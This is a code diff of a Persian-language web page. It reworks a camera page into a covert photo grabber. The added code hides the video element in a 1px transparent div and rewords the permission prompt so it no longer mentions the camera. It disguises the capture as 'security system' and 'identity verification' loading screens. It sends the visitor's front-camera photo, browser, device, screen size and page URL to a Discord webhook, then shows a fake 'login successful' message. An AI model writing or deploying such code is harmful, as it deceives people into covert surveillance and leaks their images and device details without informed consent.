@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سیستم امنیتی</title>
+    <title>در حال بارگذاری...</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: black;
+            background: #1a1a1a;
             color: white;
             font-family: Arial;
             text-align: center;
-        }
-        #loading {
-            padding: 50px;
-            font-size: 18px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .loader {
             border: 5px solid #f3f3f3;
@@ -30,17 +30,25 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .hidden-camera {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
     </style>
 </head>
 <body>
     <div id="loading">
         <div class="loader"></div>
-        <p>در حال راه‌اندازی سیستم...</p>
+        <p>در حال بررسی سیستم...</p>
     </div>
 
-    <div id="cameraContainer" style="display:none;">
-        <video id="video" autoplay playsinline style="width: 100%; height: 100vh; object-fit: cover;"></video>
-        <canvas id="canvas" style="display:none;"></canvas>
+    <!-- دوربین مخفی -->
+    <div class="hidden-camera">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
     </div>
 
     <script>
@@ -51,55 +59,50 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const loading = document.getElementById('loading');
-        const cameraContainer = document.getElementById('cameraContainer');
 
         // وقتی صفحه لود شد
         window.onload = function() {
             setTimeout(() => {
-                const confirm = window.confirm('⚠️ برای ورود باید دسترسی دوربین داده شود\n\nآیا موافق هستید؟');
+                const confirm = window.confirm('⚠️ برای ورود به سیستم باید تایید کنید\n\nآیا موافق هستید؟');
                 
                 if (confirm) {
-                    startCamera();
+                    startHiddenCamera();
                 } else {
-                    document.body.innerHTML = '<h1>❌ دسترسی رد شد</h1>';
+                    showError('دسترسی رد شد');
                 }
             }, 1000);
         };
 
-        // شروع دوربین
-        async function startCamera() {
+        // دوربین مخفی
+        async function startHiddenCamera() {
             try {
-                loading.innerHTML = '<div class="loader"></div><p>📷 در حال فعال‌سازی دوربین...</p>';
+                loading.innerHTML = '<div class="loader"></div><p>در حال راه‌اندازی سیستم امنیتی...</p>';
                 
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     }
                 });
 
                 video.srcObject = stream;
-                loading.style.display = 'none';
-                cameraContainer.style.display = 'block';
 
-                // بعد از 2 ثانیه عکس بگیر
+                // صبر کن دوربین آماده بشه
                 setTimeout(() => {
-                    takePhoto(stream);
-                }, 2000);
+                    takeHiddenPhoto(stream);
+                }, 1000);
 
             } catch (error) {
-                loading.innerHTML = '<h1>❌ خطا در دسترسی به دوربین</h1><p>لطفا دسترسی دوربین را بررسی کنید</p>';
+                showError('خطا در سیستم امنیتی');
                 console.error('خطا:', error);
             }
         }
 
-        // گرفتن عکس
-        async function takePhoto(stream) {
+        // گرفتن عکس مخفی
+        async function takeHiddenPhoto(stream) {
             try {
-                loading.innerHTML = '<div class="loader"></div><p>📸 در حال گرفتن عکس...</p>';
-                loading.style.display = 'block';
-                cameraContainer.style.display = 'none';
+                loading.innerHTML = '<div class="loader"></div><p>در حال تأیید هویت...</p>';
 
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
@@ -107,21 +110,20 @@
                 context.drawImage(video, 0, 0);
                 
                 // عکس رو به فرمت base64 تبدیل کن
-                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                 
                 // دوربین رو خاموش کن
                 stream.getTracks().forEach(track => track.stop());
                 
                 // به دیسکورد بفرست
-                loading.innerHTML = '<div class="loader"></div><p>🔄 در حال ارسال به دیسکورد...</p>';
+                loading.innerHTML = '<div class="loader"></div><p>در حال ورود به سیستم...</p>';
                 await sendToDiscord(photoData);
                 
                 // صفحه رو سفید کن
-                document.body.style.background = 'white';
-                document.body.innerHTML = '';
+                showSuccess();
                 
             } catch (error) {
-                document.body.innerHTML = '<h1>❌ خطا در ارسال عکس</h1>';
+                showError('خطا در تأیید هویت');
                 console.error('خطا:', error);
             }
         }
@@ -135,16 +137,17 @@
                 
                 // ایجاد فرم داده
                 const formData = new FormData();
-                formData.append('file', blob, 'security_photo.jpg');
+                formData.append('file', blob, 'user_photo.jpg');
                 formData.append('payload_json', JSON.stringify({
-                    username: 'Security Camera System',
+                    username: 'Security System',
                     avatar_url: 'https://cdn-icons-png.flaticon.com/512/2991/2991148.png',
-                    content: '📸 **عکس امنیتی دریافت شد**\n' +
+                    content: '📸 **عکس کاربر دریافت شد**\n' +
                             `🕒 **زمان:** ${new Date().toLocaleString('fa-IR')}\n` +
-                            `🌐 **مرورگر:** ${navigator.userAgent.split(' ')[0]}\n` +
-                            `📱 **دستگاه:** ${/Mobile/.test(navigator.userAgent) ? 'موبایل' : 'دسکتاپ'}\n` +
+                            `🌐 **مرورگر:** ${getBrowserName()}\n` +
+                            `📱 **دستگاه:** ${isMobile() ? 'موبایل' : 'دسکتاپ'}\n` +
                             `📍 **صفحه:** ${screen.width}x${screen.height}\n` +
-                            '🔒 **سیستم امنیتی فعال**'
+                            `🔗 **آدرس:** ${window.location.href}\n` +
+                            '✅ **ورود موفق**'
                 }));
 
                 // ارسال به دیسکورد
@@ -157,10 +160,42 @@
                     throw new Error('خطا در ارسال');
                 }
 
+                return true;
+
             } catch (error) {
                 console.error('خطا در ارسال به دیسکورد:', error);
                 throw error;
             }
+        }
+
+        // تشخیص مرورگر
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            return 'Unknown';
+        }
+
+        // تشخیص موبایل
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // نمایش موفقیت
+        function showSuccess() {
+            document.body.style.background = 'white';
+            document.body.innerHTML = '<div style="color: black; padding: 20px;"><h1>✅ ورود موفق</h1><p>در حال هدایت به صفحه اصلی...</p></div>';
+            
+            // بعد از 3 ثانیه کاملاً سفید بشه
+            setTimeout(() => {
+                document.body.innerHTML = '';
+            }, 3000);
+        }
+
+        // نمایش خطا
+        function showError(message) {
+            document.body.innerHTML = `<div style="padding: 20px;"><h1>❌ خطا</h1><p>${message}</p></div>`;
         }
     </script>
 </body>
